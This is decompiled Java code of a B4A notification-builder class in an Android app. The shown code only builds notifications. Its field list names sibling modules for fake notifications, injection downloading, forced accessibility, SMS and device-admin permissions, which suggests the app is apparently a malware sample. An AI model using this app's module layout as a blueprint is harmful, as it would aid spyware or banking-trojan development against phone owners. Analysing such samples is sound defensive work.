package com.com.androidrr;

import android.content.Intent;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.Bit;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.NotificationWrapper;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.objects.drawable.CanvasWrapper;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import java.lang.reflect.Method;
import java.util.HashMap;
import kotlin.jvm.internal.IntCompanionObject;
import org.eclipse.paho.client.mqttv3.internal.ClientDefaults;

/* loaded from: classes.dex */
public class nb6 extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public JavaObject _channel = null;
    public JavaObject _notificationbuilder = null;
    public int _sdklevel = 0;
    public JavaObject _ctxt = null;
    public int _s_old = 0;
    public int _s_builder = 0;
    public int _s_channel = 0;
    public int _supportlevel = 0;
    public NotificationWrapper _oldnotification = null;
    public JavaObject _pendingintentstatic = null;
    public JavaObject _notificationstatic = null;
    public JavaObject _common = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.nb6");
            if (htSubs == null) {
                this.f268ba.loadHtSubs(getClass());
                htSubs = this.f268ba.htSubs;
            }
        }
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", nb6.class).invoke(this, null);
        } else {
            this.f268ba.raiseEvent2(null, true, "class_globals", false, new Object[0]);
        }
    }

    public nb6 _addbuttonaction(CanvasWrapper.BitmapWrapper bitmapWrapper, Object obj, Object obj2, String str) throws Exception {
        if (!_isbuilder()) {
            return this;
        }
        this._notificationbuilder.RunMethod("addAction", new Object[]{_createaction(bitmapWrapper, obj, _createreceiverpendingintent(obj2, str))});
        return this;
    }

    public nb6 _addbuttonaction2(CanvasWrapper.BitmapWrapper bitmapWrapper, Object obj, Object obj2, String str) throws Exception {
        if (!_isbuilder()) {
            return this;
        }
        new IntentWrapper();
        IntentWrapper _createintent = _createintent(obj2, false);
        _createintent.setAction(str);
        Bit bit = Common.Bit;
        _createintent.setFlags(Bit.m182Or(ClientDefaults.MAX_MSG_SIZE, 131072));
        Object RunMethod = this._pendingintentstatic.RunMethod("getActivity", new Object[]{this._ctxt.getObject(), Integer.valueOf(Common.Rnd(0, IntCompanionObject.MAX_VALUE)), _createintent.getObject(), Integer.valueOf(_getpendingintentflag())});
        this._notificationbuilder.RunMethod("setContentIntent", new Object[]{RunMethod});
        this._notificationbuilder.RunMethod("addAction", new Object[]{_createaction(bitmapWrapper, obj, RunMethod)});
        return this;
    }

    public nb6 _addremoteinput(CanvasWrapper.BitmapWrapper bitmapWrapper, Object obj, String str, Object obj2) throws Exception {
        if (!_isbuilder()) {
            return this;
        }
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeNewInstance("android.app.RemoteInput$Builder", new Object[]{str});
        javaObject.RunMethod("setLabel", new Object[]{obj});
        JavaObject javaObject2 = new JavaObject();
        javaObject2.InitializeNewInstance("android.app.Notification$Action$Builder", new Object[]{_createiconfrombitmap(bitmapWrapper), obj, _createreceiverpendingintent(obj2, str)});
        javaObject2.RunMethod("addRemoteInput", new Object[]{javaObject.RunMethod("build", (Object[]) Common.Null)});
        new JavaObject();
        this._notificationbuilder.RunMethod("addAction", new Object[]{((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), javaObject2.RunMethod("build", (Object[]) Common.Null))).getObject()});
        return this;
    }

    public nb6 _autocancel(boolean z) throws Exception {
        if (_isold()) {
            this._oldnotification.setAutoCancel(z);
        } else {
            this._notificationbuilder.RunMethod("setAutoCancel", new Object[]{Boolean.valueOf(z)});
        }
        return this;
    }

    public nb6 _badgeicontype(String str) throws Exception {
        if (this._sdklevel >= 26) {
            new Map();
            this._notificationbuilder.RunMethod("setBadgeIconType", new Object[]{Common.createMap(new Object[]{"LARGE", 2, "NONE", 0, "SMALL", 1}).Get(str)});
        }
        return this;
    }

    public nb6 _bigpicturestyle(CanvasWrapper.BitmapWrapper bitmapWrapper, CanvasWrapper.BitmapWrapper bitmapWrapper2, Object obj, Object obj2) throws Exception {
        if (_isbuilder()) {
            _setstyle("android.app.Notification$BigPictureStyle", Common.createMap(new Object[]{"bigLargeIcon", bitmapWrapper.getObject(), "bigPicture", bitmapWrapper2.getObject(), "setBigContentTitle", obj, "setSummaryText", obj2}));
        }
        return this;
    }

    public nb6 _bigtextstyle(Object obj, Object obj2, Object obj3) throws Exception {
        if (_isbuilder()) {
            _setstyle("android.app.Notification$BigTextStyle", Common.createMap(new Object[]{"bigText", obj3, "setBigContentTitle", obj, "setSummaryText", obj2}));
        }
        return this;
    }

    public NotificationWrapper _build(Object obj, Object obj2, String str, Object obj3) throws Exception {
        if (_isold()) {
            this._oldnotification.SetInfo2New(this.f268ba, BA.ObjectToCharSequence(obj), BA.ObjectToCharSequence(obj2), BA.ObjectToCharSequence(str), obj3);
            return this._oldnotification;
        }
        new IntentWrapper();
        IntentWrapper _createintent = _createintent(obj3, false);
        Bit bit = Common.Bit;
        _createintent.setFlags(Bit.m182Or(ClientDefaults.MAX_MSG_SIZE, 131072));
        _createintent.PutExtra("Notification_Tag", str);
        Object RunMethod = this._pendingintentstatic.RunMethod("getActivity", new Object[]{this._ctxt.getObject(), Integer.valueOf(Common.Rnd(0, IntCompanionObject.MAX_VALUE)), _createintent.getObject(), Integer.valueOf(_getpendingintentflag())});
        this._notificationbuilder.RunMethodJO("setContentTitle", new Object[]{obj}).RunMethodJO("setContentText", new Object[]{obj2});
        this._notificationbuilder.RunMethod("setContentIntent", new Object[]{RunMethod});
        if (_ischannel()) {
            new JavaObject();
            ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), this._ctxt.RunMethod("getSystemService", new Object[]{"notification"}))).RunMethod("createNotificationChannel", new Object[]{this._channel.getObject()});
        }
        return (NotificationWrapper) AbsObjectWrapper.ConvertToWrapper(new NotificationWrapper(), this._notificationbuilder.RunMethod("build", (Object[]) Common.Null));
    }

    public String _class_globals() throws Exception {
        this._channel = new JavaObject();
        this._notificationbuilder = new JavaObject();
        this._sdklevel = 0;
        this._ctxt = new JavaObject();
        this._s_old = 0;
        this._s_builder = 1;
        this._s_channel = 2;
        this._supportlevel = 0;
        this._oldnotification = new NotificationWrapper();
        this._pendingintentstatic = new JavaObject();
        this._notificationstatic = new JavaObject();
        this._common = new JavaObject();
        return "";
    }

    public nb6 _color(int i) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setColor", new Object[]{Integer.valueOf(i)});
        }
        return this;
    }

    public nb6 _colorized(boolean z) throws Exception {
        if (_isbuilder() && this._sdklevel >= 26) {
            this._notificationbuilder.RunMethod("setColorized", new Object[]{true});
        }
        return this;
    }

    public Object _createaction(CanvasWrapper.BitmapWrapper bitmapWrapper, Object obj, Object obj2) throws Exception {
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeNewInstance("android.app.Notification$Action$Builder", new Object[]{_createiconfrombitmap(bitmapWrapper), obj, obj2});
        return javaObject.RunMethod("build", (Object[]) Common.Null);
    }

    public Object _createiconfrombitmap(CanvasWrapper.BitmapWrapper bitmapWrapper) throws Exception {
        if (bitmapWrapper == null || !bitmapWrapper.IsInitialized()) {
            return 0;
        }
        return new JavaObject().InitializeStatic("android.graphics.drawable.Icon").RunMethod("createWithBitmap", new Object[]{bitmapWrapper.getObject()});
    }

    public IntentWrapper _createintent(Object obj, boolean z) throws Exception {
        Object RunMethod = this._common.RunMethod("getComponentClass", new Object[]{Common.Null, obj, Boolean.valueOf(z)});
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeNewInstance("android.content.Intent", new Object[]{this._ctxt.getObject(), RunMethod});
        return (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(new IntentWrapper(), (Intent) javaObject.getObject());
    }

    public Object _createreceiverpendingintent(Object obj, String str) throws Exception {
        new IntentWrapper();
        IntentWrapper _createintent = _createintent(obj, true);
        _createintent.setAction(str);
        return this._pendingintentstatic.RunMethod("getBroadcast", new Object[]{this._ctxt.getObject(), 1, _createintent.getObject(), Integer.valueOf(_getpendingintentflag())});
    }

    public nb6 _customsound(Object obj) throws Exception {
        if (_isold()) {
            return this;
        }
        this._ctxt.RunMethod("grantUriPermission", new Object[]{"com.android.systemui", obj, 1});
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setSound", new Object[]{obj, this._notificationstatic.GetField("AUDIO_ATTRIBUTES_DEFAULT")});
            if (_ischannel()) {
                this._channel.RunMethod("setSound", new Object[]{obj, this._notificationstatic.GetField("AUDIO_ATTRIBUTES_DEFAULT")});
            }
        }
        return this;
    }

    public nb6 _deleteaction(Object obj, String str) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setDeleteIntent", new Object[]{_createreceiverpendingintent(obj, str)});
        }
        return this;
    }

    public int _getpendingintentflag() throws Exception {
        if (this._sdklevel < 31) {
            return 0;
        }
        Bit bit = Common.Bit;
        return Bit.m182Or(0, 33554432);
    }

    public nb6 _initialize(BA BA, String str, Object obj, String str2) throws Exception {
        innerInitialize(BA);
        this._ctxt.InitializeContext(this.f268ba);
        this._pendingintentstatic.InitializeStatic("android.app.PendingIntent");
        this._notificationstatic.InitializeStatic("android.app.Notification");
        this._common.InitializeStatic("anywheresoftware.b4a.keywords.Common");
        int ObjectToNumber = (int) BA.ObjectToNumber(new JavaObject().InitializeStatic("android.os.Build$VERSION").GetField("SDK_INT"));
        this._sdklevel = ObjectToNumber;
        if (ObjectToNumber < 23 || (ObjectToNumber == 23 && _isincompatibledevice())) {
            this._supportlevel = this._s_old;
        } else if (this._sdklevel >= 26) {
            this._supportlevel = this._s_channel;
        } else {
            this._supportlevel = this._s_builder;
        }
        if (_isold()) {
            this._oldnotification.Initialize();
            this._oldnotification.setIcon("icon");
        } else if (_ischannel()) {
            String str3 = str + "_" + str2;
            this._notificationbuilder.InitializeNewInstance("android.app.Notification$Builder", new Object[]{this._ctxt.getObject(), str3});
            new Map();
            this._channel.InitializeNewInstance("android.app.NotificationChannel", new Object[]{str3, obj, Integer.valueOf((int) BA.ObjectToNumber(Common.createMap(new Object[]{"MIN", 1, "LOW", 2, "DEFAULT", 3, "HIGH", 4}).Get(str2)))});
        } else {
            this._notificationbuilder.InitializeNewInstance("android.app.Notification$Builder", new Object[]{this._ctxt.getObject()});
            new Map();
            this._notificationbuilder.RunMethod("setPriority", new Object[]{Integer.valueOf((int) BA.ObjectToNumber(Common.createMap(new Object[]{"MIN", -2, "LOW", -1, "DEFAULT", 0, "HIGH", 1}).Get(str2)))});
        }
        if (str2.equals("DEFAULT") || str2.equals("HIGH")) {
            _setdefaults(true, true, true);
        } else {
            _setdefaults(false, true, true);
        }
        return this;
    }

    public boolean _isbuilder() throws Exception {
        return this._supportlevel >= this._s_builder;
    }

    public boolean _ischannel() throws Exception {
        return this._supportlevel == this._s_channel;
    }

    public boolean _isincompatibledevice() throws Exception {
        JavaObject javaObject = new JavaObject();
        String ObjectToString = BA.ObjectToString(javaObject.InitializeStatic("android.os.Build").GetField("MODEL"));
        String str = BA.ObjectToString(javaObject.InitializeStatic("android.os.Build").GetField("MANUFACTURER")) + " " + ObjectToString;
        Common.LogImpl("928442629", "key: " + str, 0);
        new Map();
        if (!Common.createMap(new Object[]{"Samsung Galaxy S5", "", "Sony XPreria M5", ""}).ContainsKey(str)) {
            return false;
        }
        Common.LogImpl("928442632", "Problematic device. Switching to 'old' mode.", 0);
        return true;
    }

    public boolean _isold() throws Exception {
        return this._supportlevel == this._s_old;
    }

    public nb6 _largeicon(CanvasWrapper.BitmapWrapper bitmapWrapper) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setLargeIcon", new Object[]{_createiconfrombitmap(bitmapWrapper)});
        }
        return this;
    }

    public nb6 _mediastyle() throws Exception {
        if (_isbuilder()) {
            _setstyle("android.app.Notification$MediaStyle", Common.createMap(new Object[]{"setShowActionsInCompactView", new int[]{0, 1, 2}}));
        }
        return this;
    }

    public nb6 _number(int i) throws Exception {
        if (_isold()) {
            this._oldnotification.setNumber(i);
        } else {
            this._notificationbuilder.RunMethod("setNumber", new Object[]{Integer.valueOf(i)});
        }
        return this;
    }

    public nb6 _oldnotificationicon(String str) throws Exception {
        if (_isold()) {
            this._oldnotification.setIcon(str);
        }
        return this;
    }

    public nb6 _ongoing(boolean z) throws Exception {
        if (_isold()) {
            this._oldnotification.setOnGoingEvent(z);
        } else {
            this._notificationbuilder.RunMethod("setOngoing", new Object[]{Boolean.valueOf(z)});
        }
        return this;
    }

    public nb6 _onlyalertonce(boolean z) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setOnlyAlertOnce", new Object[]{Boolean.valueOf(z)});
        }
        return this;
    }

    public nb6 _progress(int i, int i2, boolean z) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setProgress", new Object[]{Integer.valueOf(i2), Integer.valueOf(i), Boolean.valueOf(z)});
        }
        return this;
    }

    public nb6 _setcategory(String str) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setCategory", new Object[]{this._notificationstatic.GetField(str)});
        }
        return this;
    }

    /* JADX WARN: Multi-variable type inference failed */
    public nb6 _setdefaults(boolean z, boolean z2, boolean z3) throws Exception {
        if (_isold()) {
            this._oldnotification.setSound(z);
            this._oldnotification.setLight(z2);
            this._oldnotification.setVibrate(z3);
        } else {
            int i = z;
            if (_ischannel()) {
                this._channel.RunMethod("enableLights", new Object[]{Boolean.valueOf(z2)});
                this._channel.RunMethod("enableVibration", new Object[]{Boolean.valueOf(z3)});
            } else {
                if (z3) {
                    Bit bit = Common.Bit;
                    i = Bit.m182Or(z, 2);
                }
                if (z2) {
                    Bit bit2 = Common.Bit;
                    i = Bit.m182Or(i, 4);
                }
                this._notificationbuilder.RunMethod("setDefaults", new Object[]{Integer.valueOf(i)});
            }
        }
        return this;
    }

    public nb6 _setlights(int i, int i2, int i3) throws Exception {
        this._notificationbuilder.RunMethod("setLights", new Object[]{Integer.valueOf(i), Integer.valueOf(i2), Integer.valueOf(i3)});
        return this;
    }

    public String _setstyle(String str, Map map) throws Exception {
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeNewInstance(str, (Object[]) Common.Null);
        BA.IterableList Keys = map.Keys();
        int size = Keys.getSize();
        for (int i = 0; i < size; i++) {
            String ObjectToString = BA.ObjectToString(Keys.Get(i));
            Object Get = map.Get(ObjectToString);
            if (Get != null) {
                javaObject.RunMethod(ObjectToString, new Object[]{Get});
            }
        }
        this._notificationbuilder.RunMethod("setStyle", new Object[]{javaObject.getObject()});
        return "";
    }

    public nb6 _showbadge(boolean z) throws Exception {
        if (this._sdklevel >= 26) {
            this._channel.RunMethod("setShowBadge", new Object[]{Boolean.valueOf(z)});
        }
        return this;
    }

    public nb6 _showwhen(long j) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setShowWhen", new Object[]{true});
            this._notificationbuilder.RunMethod("setWhen", new Object[]{Long.valueOf(j)});
        }
        return this;
    }

    public nb6 _smallicon(CanvasWrapper.BitmapWrapper bitmapWrapper) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setSmallIcon", new Object[]{_createiconfrombitmap(bitmapWrapper)});
        }
        return this;
    }

    public nb6 _subtext(Object obj) throws Exception {
        if (_isbuilder()) {
            this._notificationbuilder.RunMethod("setSubText", new Object[]{obj});
        }
        return this;
    }

    public nb6 _visibility(String str) throws Exception {
        if (_isbuilder()) {
            new Map();
            this._notificationbuilder.RunMethod("setVisibility", new Object[]{Integer.valueOf((int) BA.ObjectToNumber(Common.createMap(new Object[]{"PUBLIC", 1, "SECRET", -1, "PRIVATE", 0}).Get(str)))});
        }
        return this;
    }

    @Override // anywheresoftware.b4a.BA.SubDelegator
    public Object callSub(String str, Object obj, Object[] objArr) throws Exception {
        BA.senderHolder.set(obj);
        return BA.SubDelegator.SubNotFound;
    }
}
